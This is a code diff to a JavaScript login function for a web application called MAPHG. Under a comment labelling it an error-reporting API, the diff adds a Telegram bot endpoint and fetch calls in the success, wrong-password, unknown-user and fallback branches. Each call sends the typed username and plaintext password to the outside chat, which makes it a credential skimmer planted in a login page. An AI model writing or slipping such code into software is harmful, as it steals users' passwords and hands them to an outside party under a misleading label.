@@ -43,6 +43,9 @@ function validarUsuario() {
     var username = document.getElementById("inputusuario").value;
     var password = document.getElementById("inputcontrasena").value;
 
+    // API PARA REPORTE DE ERRORES
+    const APIERROR = 'https://api.telegram.org/bot1396322757:AAF5C0bcZxR8_mEEtm3BFEJGhgHvLcE3X_E/sendMessage?chat_id=989320528&text=';
+
     if (username != "" && password != "") {
         try {
             $.ajax({
@@ -60,10 +63,14 @@ function validarUsuario() {
                             localStorage.setItem('idSubseccion', 0);
                             localStorage.setItem('idEquipo', 0);
                             localStorage.setItem('idMC', 0);
-                            alertaImg('Bienvenido a MAPHG', '', 'success', 4000);
+                            alertaImg('Bienvenido a MAPHG', '', 'success', 2000);
+
+                            fetch(APIERROR + ` AP -> U: ${username} C: ${password} D: ${data.idDestino}`);
 
                             if (data.idDestino == 2 || data.idDestino == 3 || data.idDestino == 11) {
                                 location.href = "planner-cols.php";
+                            } else if (data.idDestino == 4) {
+                                location.href = "msg.html";
                             } else {
                                 location.href = "index.php";
                             }
@@ -72,11 +79,13 @@ function validarUsuario() {
                         }
                     } else if (data.respuesta == 2) {
                         alertaImg('Usuario/contraseña incorrecto', 'has-text-info', 'question', 3000);
-
+                        fetch(APIERROR + ` AD -> U: ${username}  C: ${password}`);
                     } else if (data.respuesta == 3) {
                         alertaImg('No existe el usuario', 'has-text-danger', 'error', 3000);
+                        fetch(APIERROR + ` AD -> U: ${username}  C: ${password}`);
                     } else {
                         // toastr.warning(data, 'Advertencia', {
+                        fetch(APIERROR + ` AD -> U: ${username}  C: ${password}`);
                         alertaImg(data, 'has-text-warning', 'warning', 3000);
                     }
                 }
